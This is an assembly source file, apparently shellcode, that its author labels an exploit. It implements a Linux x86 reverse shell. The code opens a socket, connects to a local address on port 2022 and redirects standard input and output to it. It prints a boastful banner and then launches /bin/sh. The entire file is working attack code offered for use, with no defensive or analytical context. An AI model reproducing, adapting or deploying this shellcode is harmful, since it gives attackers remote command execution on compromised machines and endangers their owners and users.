;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Crypt00o-Exploit.asm                                                                                                                                                 ;
;reverse shell for linux on your local ip address with port 2022  and if it done this message will be sended to u '[+] 0xCrypt00o evil Shellcoder : #' with the shell ; 
;coded by Crypt00o ,Member Of Shellcoders CyberForces 	                                                                                                              ;
;Cryp00o@github		    		    		                                                                                                              ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

section .text
global _start

_start:

xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

add esp,8

push byte 0x6
push byte 0x1
push byte 0x2

mov al,0x66
mov bl,0x1
mov ecx,esp

int 0x80

mov edi,eax

xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

add esp,8

push eax
push byte 0x01
push eax
push eax
push 0x7f
push word 0xe607
push word 0x2

mov esi,esp

push 0x10
push esi
push edi

mov al,0x66
mov bl,0x3
mov ecx,esp

int 0x80

xor ecx,ecx
xor eax,eax
xor ebx,ebx
xor eax,eax

mov ebx,edi


duplop:
mov al,0x3f
int 0x80
inc cl
cmp cl,0x3
jl duplop

xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

add esp,0x8


push eax
push 0x20202320
push 0x3a207265
push 0x646f636c
push 0x6c656853
push 0x206c6976
push 0x65206f30
push 0x30747079
push 0x72437830
push 0x205d2b5b

mov al,0x4
mov bl,0x1
mov dl,0x25
mov ecx,esp

int 0x80

xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

add esp,0x8

push eax

push 0x68732f6e
push 0x69622f2f

mov al,0xb
mov ebx,esp
int 0x80
